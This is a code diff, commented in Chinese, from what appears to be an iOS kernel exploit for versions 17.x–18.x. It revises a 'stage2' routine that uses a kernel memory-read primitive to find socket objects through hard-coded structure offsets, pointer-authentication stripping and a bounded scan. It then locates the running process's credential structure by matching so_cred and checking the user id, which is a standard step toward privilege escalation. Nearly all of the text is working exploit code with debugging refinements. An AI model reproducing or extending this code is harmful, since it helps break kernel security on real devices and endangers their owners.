@@ -263,35 +263,98 @@ static uint64_t ds3105_S(uint64_t raw)
     return v;
 }
 
+/// 有界兜底：只在 pcb 结构内（0x0~0x400、8 字节步进）找一个"像 socket 对象"的指针。
+/// 判定：内核地址 + zone 段 + 16 字节对齐 + 其 +off_socket_so_usecount 处是个小整数（1~0x1000）。
+/// 这是最后手段——**不做全内存扫描**，且后面 cred 定位还有"两 socket so_cred 一致 + cr_uid"强校验兜底，
+/// 选错也只会在下一跳干净失败，不会写内核。
+static uint64_t ds3105_scan_pcb_for_socket(uint64_t pcb)
+{
+    uint32_t usecountOff = t3105_off_socket_so_usecount;
+    if (usecountOff == 0) usecountOff = 0x254;   // 17.x–18.x 的 socket.so_usecount
+
+    for (uint64_t o = 0; o <= 0x400; o += 8) {
+        uint64_t cand = t3105_kread64(pcb + o);
+        if (!ds3105_is_kaddr(cand) || !ds3105_is_zone(cand)) continue;
+        if ((cand & 0xF) != 0) continue;
+        uint32_t cnt = t3105_kread32(cand + usecountOff);
+        if (cnt >= 1 && cnt <= 0x1000) {
+            NSLog(@"[3105] stage2 diag: 有界扫描命中候选 socket=0x%llx（pcb+0x%llx, usecount=%u）",
+                  (unsigned long long)cand, (unsigned long long)o, cnt);
+            return cand;
+        }
+    }
+    return 0;
+}
+
 /// 定位本进程 cred：两个 socket 的 so_cred 指向同一对象 + cr_uid 校验
 /// （历史 4/4 命中 socket+0x208；这里用有界扫描 0x1f0~0x230，不写死偏移）
+///
+/// 0.6.0 真机反馈：stage2 在「取 socket 对象」这一跳失败（escape(-1) socket object address invalid）。
+/// 因此这里把每一步原始值都打出来，并加两个**有界**兜底：
+///   ① off_inpcb_inp_socket 为 0 → 回退常量 0x40（两个后端在 17.x–18.x 都是这个值）
+///   ② 读出的指针没通过校验 → 先试 XPACI 规范化，再试"只在 pcb 结构内"的有界扫描
 static uint64_t ds3105_find_cred(NSString **why)
 {
     uint64_t rwPcb  = t3105_rwSocketPcb;
     uint64_t ctlPcb = t3105_controlSocketPcb;
+    uint32_t off    = t3105_off_inpcb_inp_socket;
+
+    NSLog(@"[3105] stage2 diag: rwSocketPcb=0x%llx controlSocketPcb=0x%llx off_inpcb_inp_socket=0x%x off_socket_so_usecount=0x%x",
+          (unsigned long long)rwPcb, (unsigned long long)ctlPcb, off, t3105_off_socket_so_usecount);
+
     if (!ds3105_is_kaddr(rwPcb) || !ds3105_is_kaddr(ctlPcb)) {
-        if (why) *why = @"socket pcb invalid (kernel stage not established?)";
+        if (why) *why = [NSString stringWithFormat:
+                         @"socket pcb invalid（rw=0x%llx ctl=0x%llx；3105 的 pcb 全局量没被赋值?）",
+                         (unsigned long long)rwPcb, (unsigned long long)ctlPcb];
         return 0;
     }
-    uint64_t s0 = t3105_kread64(rwPcb  + t3105_off_inpcb_inp_socket);
-    uint64_t s1 = t3105_kread64(ctlPcb + t3105_off_inpcb_inp_socket);
+    if (off == 0) {
+        off = 0x40;
+        NSLog(@"[3105] stage2 diag: off_inpcb_inp_socket 为 0 → 回退常量 0x40");
+    }
+
+    uint64_t s0raw = t3105_kread64(rwPcb  + off);
+    uint64_t s1raw = t3105_kread64(ctlPcb + off);
+    uint64_t s0 = ds3105_is_kaddr(s0raw) ? s0raw : ds3105_S(s0raw);
+    uint64_t s1 = ds3105_is_kaddr(s1raw) ? s1raw : ds3105_S(s1raw);
+    NSLog(@"[3105] stage2 diag: socket 原始值 rw=0x%llx→0x%llx ctl=0x%llx→0x%llx（off=0x%x）",
+          (unsigned long long)s0raw, (unsigned long long)s0,
+          (unsigned long long)s1raw, (unsigned long long)s1, off);
+
     if (!ds3105_is_kaddr(s0) || !ds3105_is_kaddr(s1)) {
-        if (why) *why = @"socket object address invalid";
-        return 0;
+        uint64_t a = ds3105_scan_pcb_for_socket(rwPcb);
+        uint64_t b = ds3105_scan_pcb_for_socket(ctlPcb);
+        if (a && b) {
+            s0 = a; s1 = b;
+            NSLog(@"[3105] stage2 diag: 改用有界扫描结果 rw=0x%llx ctl=0x%llx",
+                  (unsigned long long)s0, (unsigned long long)s1);
+        } else {
+            if (why) *why = [NSString stringWithFormat:
+                             @"socket object address invalid（rw raw=0x%llx→0x%llx, ctl raw=0x%llx→0x%llx, off=0x%x, 扫描 rw=0x%llx ctl=0x%llx）",
+                             (unsigned long long)s0raw, (unsigned long long)s0,
+                             (unsigned long long)s1raw, (unsigned long long)s1,
+                             off, (unsigned long long)a, (unsigned long long)b];
+            return 0;
+        }
     }
 
     uid_t me = getuid();
-    for (uint64_t off = 0x1f0; off <= 0x230; off += 8) {
-        uint64_t a = t3105_kread64(s0 + off);
+    for (uint64_t so = 0x1f0; so <= 0x230; so += 8) {
+        uint64_t a = t3105_kread64(s0 + so);
         if (!a) continue;
-        uint64_t b = t3105_kread64(s1 + off);
+        uint64_t b = t3105_kread64(s1 + so);
         if (a != b) continue;
-        if (!ds3105_is_kaddr(a) || (a & 0xF) != 0) continue;
+        uint64_t cand = ds3105_is_kaddr(a) ? a : ds3105_S(a);
+        if (!ds3105_is_kaddr(cand) || (cand & 0xF) != 0) continue;
         // posix_cred 在 ucred+0x18，cr_uid 在它开头
-        if (t3105_kread32(a + 0x18) != (uint32_t)me) continue;
-        return a;
+        if (t3105_kread32(cand + 0x18) != (uint32_t)me) continue;
+        NSLog(@"[3105] stage2 diag: cred 命中 socket+0x%llx → 0x%llx（uid=%u）",
+              (unsigned long long)so, (unsigned long long)cand, (unsigned)me);
+        return cand;
     }
-    if (why) *why = @"no shared so_cred passing cr_uid check";
+    if (why) *why = [NSString stringWithFormat:
+                     @"no shared so_cred passing cr_uid check（rw=0x%llx ctl=0x%llx）",
+                     (unsigned long long)s0, (unsigned long long)s1];
     return 0;
 }
 
